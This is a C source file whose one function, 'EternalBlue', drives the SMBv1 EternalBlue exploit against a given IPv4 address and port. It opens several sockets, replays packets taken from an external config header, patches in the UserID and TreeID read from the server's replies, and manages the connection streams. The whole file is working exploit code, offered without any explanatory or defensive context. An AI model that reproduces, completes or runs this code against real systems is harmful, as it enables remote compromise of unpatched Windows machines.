#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <limits.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS];
    WSADATA wsa_data;
    struct sockaddr_in address;
    uint8_t userid[2] = { 0, 0 };
    uint8_t treeid[2] = { 0, 0 };
    const char userid_placeholder[] = "__USERID__PLACEHOLDER__";
    const char treeid_placeholder[] = "__TREEID__PLACEHOLDER__";
    size_t packet_data_size = sizeof(EB_PACKETS) - 1;
    int wsa_started = 0;
    int result = -1;
    size_t i;

    for (i = 0; i < NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (ip == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        printf("EternalBlue: invalid IPv4 address\n");
        goto cleanup;
    }

    for (i = 0; i < (size_t)EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];
        int stream = (int)op->stream;
        size_t socket_index;
        uint64_t offset_value;
        uint64_t length_value;
        size_t length;

        if (stream < 1 || stream > NUM_SOCKETS) {
            printf("EternalBlue: invalid stream at operation %lu\n", (unsigned long)i);
            goto cleanup;
        }
        socket_index = (size_t)(stream - 1);

        switch (op->kind) {
        case 0:
            printf("EternalBlue: connect stream %d\n", stream);
            if (sockets[socket_index] != INVALID_SOCKET) {
                printf("EternalBlue: stream %d is already connected\n", stream);
                goto cleanup;
            }
            sockets[socket_index] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[socket_index] == INVALID_SOCKET ||
                connect(sockets[socket_index], (const struct sockaddr *)&address,
                        (int)sizeof(address)) == SOCKET_ERROR) {
                printf("EternalBlue: connect failed on stream %d\n", stream);
                goto cleanup;
            }
            break;

        case 1: {
            const uint8_t *source;
            uint8_t *buffer;
            size_t input_position = 0;
            size_t output_position = 0;
            size_t userid_placeholder_length = sizeof(userid_placeholder) - 1;
            size_t treeid_placeholder_length = sizeof(treeid_placeholder) - 1;
            size_t sent = 0;

            offset_value = (uint64_t)op->offset;
            length_value = (uint64_t)op->length;
            if (offset_value > packet_data_size ||
                length_value > packet_data_size - (size_t)offset_value ||
                length_value > INT_MAX ||
                sockets[socket_index] == INVALID_SOCKET) {
                printf("EternalBlue: invalid send operation %lu\n", (unsigned long)i);
                goto cleanup;
            }

            length = (size_t)length_value;
            source = (const uint8_t *)EB_PACKETS + (size_t)offset_value;
            buffer = (uint8_t *)malloc(length == 0 ? 1 : length);
            if (buffer == NULL)
                goto cleanup;

            while (input_position < length) {
                size_t remaining = length - input_position;

                if (remaining >= userid_placeholder_length &&
                    memcmp(source + input_position, userid_placeholder,
                           userid_placeholder_length) == 0) {
                    memcpy(buffer + output_position, userid, sizeof(userid));
                    input_position += userid_placeholder_length;
                    output_position += sizeof(userid);
                } else if (remaining >= treeid_placeholder_length &&
                           memcmp(source + input_position, treeid_placeholder,
                                  treeid_placeholder_length) == 0) {
                    memcpy(buffer + output_position, treeid, sizeof(treeid));
                    input_position += treeid_placeholder_length;
                    output_position += sizeof(treeid);
                } else {
                    buffer[output_position++] = source[input_position++];
                }
            }

            while (sent < output_position) {
                int bytes_sent = send(sockets[socket_index],
                                      (const char *)buffer + sent,
                                      (int)(output_position - sent), 0);
                if (bytes_sent == SOCKET_ERROR || bytes_sent == 0) {
                    printf("EternalBlue: send failed on stream %d\n", stream);
                    free(buffer);
                    goto cleanup;
                }
                sent += (size_t)bytes_sent;
            }

            printf("EternalBlue: sent %lu bytes on stream %d\n",
                   (unsigned long)output_position, stream);
            free(buffer);
            break;
        }

        case 2: {
            uint8_t *response;
            size_t received = 0;

            length_value = (uint64_t)op->length;
            if (length_value > INT_MAX || sockets[socket_index] == INVALID_SOCKET) {
                printf("EternalBlue: invalid receive operation %lu\n", (unsigned long)i);
                goto cleanup;
            }
            length = (size_t)length_value;
            if ((op->fix == 1 && length < 34) ||
                (op->fix == 2 && length < 30)) {
                printf("EternalBlue: response too short for identifier update\n");
                goto cleanup;
            }

            response = (uint8_t *)malloc(length == 0 ? 1 : length);
            if (response == NULL)
                goto cleanup;

            while (received < length) {
                int bytes_received = recv(sockets[socket_index],
                                          (char *)response + received,
                                          (int)(length - received), 0);
                if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
                    printf("EternalBlue: receive failed on stream %d\n", stream);
                    free(response);
                    goto cleanup;
                }
                received += (size_t)bytes_received;
            }

            if (op->fix == 1) {
                userid[0] = response[32];
                userid[1] = response[33];
                printf("EternalBlue: updated UserID\n");
            } else if (op->fix == 2) {
                treeid[0] = response[28];
                treeid[1] = response[29];
                printf("EternalBlue: updated TreeID\n");
            } else if (op->fix != 0) {
                printf("EternalBlue: invalid receive fix value\n");
                free(response);
                goto cleanup;
            }

            printf("EternalBlue: received %lu bytes on stream %d\n",
                   (unsigned long)received, stream);
            free(response);
            break;
        }

        case 3:
            printf("EternalBlue: close stream %d\n", stream);
            if (sockets[socket_index] == INVALID_SOCKET ||
                closesocket(sockets[socket_index]) == SOCKET_ERROR) {
                printf("EternalBlue: close failed on stream %d\n", stream);
                goto cleanup;
            }
            sockets[socket_index] = INVALID_SOCKET;
            break;

        default:
            printf("EternalBlue: invalid operation kind at operation %lu\n",
                   (unsigned long)i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 0; i < NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
            sockets[i] = INVALID_SOCKET;
        }
    }
    if (wsa_started)
        WSACleanup();
    return result;
}